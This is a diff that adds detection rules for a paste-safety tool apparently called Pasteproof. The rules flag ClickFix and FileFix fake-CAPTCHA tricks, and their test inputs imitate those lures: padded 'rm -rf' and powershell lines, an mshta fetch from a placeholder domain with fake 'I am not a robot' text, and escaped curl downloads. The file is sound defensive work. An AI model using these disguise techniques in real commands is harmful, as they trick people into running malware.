@@ -1,0 +1,152 @@
+# Tricks that hide what a pasted command really does.
+schema = 1
+
+[[rule]]
+id = "PP010"
+title = "Part of the command is pushed off-screen"
+severity = "caution"
+score = 30
+platforms = ["linux", "macos", "windows"]
+all = ["whitespace_padding"]
+explain = "Part of this command is hidden after {spaces} spaces, so it scrolls out of view in most windows. Pasteproof has shown the hidden part below."
+advice = "Read the hidden part. Legitimate commands have no reason to hide text."
+
+[[rule.test]]
+input = "echo ok                                                  ; rm -rf ~/tmp-fixture"
+expect = "match"
+
+[[rule.test]]
+input = "printf '%-10s %s\\n' a b"
+expect = "no-match"
+
+[[rule]]
+id = "PP011"
+title = "Hidden text alongside a download or decoy"
+severity = "danger"
+score = 70
+platforms = ["linux", "macos", "windows"]
+# A hiding trick combined with a download.
+all = ["download"]
+any = ["whitespace_padding", "invisible_chars", "confusable_chars"]
+explain = "Uses hidden or lookalike characters in a command that downloads from {host}. This is how ClickFix pages disguise malware."
+advice = "Do not run this. Close the page that gave it to you."
+
+[[rule.test]]
+input = "curl -s https://get.example/a -o a                                        # verification"
+expect = "match"
+
+[[rule.test]]
+input = "curl -s https://get.example/a -o a"
+expect = "no-match"
+
+[[rule]]
+id = "PP012"
+title = "Invisible or lookalike characters"
+severity = "caution"
+score = 30
+platforms = ["linux", "macos", "windows"]
+any = ["invisible_chars", "confusable_chars"]
+explain = "Contains invisible or lookalike Unicode characters that can make a command look different from what it really does."
+advice = "Retype the command yourself instead of pasting it."
+
+[[rule.test]]
+input = "echo hel​lo"
+expect = "match"
+
+[[rule.test]]
+input = "echo hello"
+expect = "no-match"
+
+[[rule]]
+id = "PP013"
+title = "Fake verification text"
+severity = "caution"
+score = 30
+platforms = ["linux", "macos", "windows"]
+all = ["decoy_comment"]
+explain = "Contains fake verification text (such as \"I am not a robot\"). Real CAPTCHAs never ask you to run anything."
+advice = "Do not run this. Close the page that asked you to paste it."
+
+[[rule.test]]
+input = "echo hi # I am not a robot - reCAPTCHA Verification ID: 4821"
+expect = "match"
+
+[[rule.test]]
+input = "make test # run the unit tests"
+expect = "no-match"
+
+[[rule]]
+id = "PP014"
+title = "Fake verification text with a download or Windows tool"
+severity = "danger"
+score = 75
+platforms = ["linux", "macos", "windows"]
+all = ["decoy_comment"]
+any = ["download", "download_exec", "lolbin_remote", "encoded_command", "decode_exec"]
+explain = "Pairs fake verification text with a command that downloads or runs code. This is the signature of a ClickFix fake-CAPTCHA attack."
+advice = "Do not run this. Close the page that asked you to paste it."
+references = ["https://attack.mitre.org/techniques/T1204/004/"]
+
+[[rule.test]]
+input = "mshta https://pp-fixture-2.icu/check # I am not a robot - Verification ID: 8812"
+expect = "match"
+
+[[rule.test]]
+input = "echo hi # I am not a robot"
+expect = "no-match"
+
+[[rule]]
+id = "PP015"
+title = "Disguised command"
+severity = "caution"
+score = 30
+platforms = ["linux", "macos", "windows"]
+all = ["obfuscation"]
+explain = "Disguises parts of the command (split strings, escape characters or character codes) so it's harder to read."
+advice = "Ask yourself why a command would need to be disguised. Don't run it unless you understand it."
+
+[[rule.test]]
+input = "c\\u\\r\\l --version"
+expect = "match"
+
+[[rule.test]]
+input = "curl --version"
+expect = "no-match"
+
+[[rule]]
+id = "PP016"
+title = "Disguised command that downloads code"
+severity = "danger"
+score = 70
+platforms = ["linux", "macos", "windows"]
+all = ["obfuscation"]
+any = ["download", "download_exec", "decode_exec", "lolbin_remote"]
+explain = "Disguises a command that downloads or runs code from {host}. Legitimate installers have no reason to do this."
+advice = "Do not run this."
+
+[[rule.test]]
+input = "c\\u\\r\\l -s https://get.example/a -o /tmp/a"
+expect = "match"
+
+[[rule.test]]
+input = "curl -s https://get.example/a -o /tmp/a"
+expect = "no-match"
+
+[[rule]]
+id = "PP017"
+title = "Hides the real command behind spaces and a fake message"
+severity = "danger"
+score = 75
+platforms = ["linux", "macos", "windows"]
+all = ["whitespace_padding", "decoy_comment"]
+explain = "Hides the real command behind {spaces} spaces and shows harmless-looking text (a file path or a verification message) instead. This is the FileFix / ClickFix trick."
+advice = "Do not run this. Close the page that asked you to paste it."
+references = ["https://attack.mitre.org/techniques/T1204/004/"]
+
+[[rule.test]]
+input = "powershell -c ping update.example                                                  # C:\\Company\\HR-Policy.docx"
+expect = "match"
+
+[[rule.test]]
+input = "make test # run the unit tests"
+expect = "no-match"
